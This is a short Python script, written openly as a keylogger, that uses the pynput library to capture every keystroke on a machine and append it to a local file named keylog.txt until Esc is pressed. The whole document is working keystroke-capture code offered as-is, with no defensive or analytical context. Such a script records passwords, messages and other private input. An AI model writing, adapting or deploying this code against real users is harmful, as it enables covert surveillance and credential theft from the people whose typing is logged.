from pynput import keyboard

# File to save logs
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:  # Special keys like shift, ctrl
        with open(LOG_FILE, "a") as log:
            log.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop keylogger when 'Esc' is pressed
        print("Keylogger stopped.")
        return False

# Setting up listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()
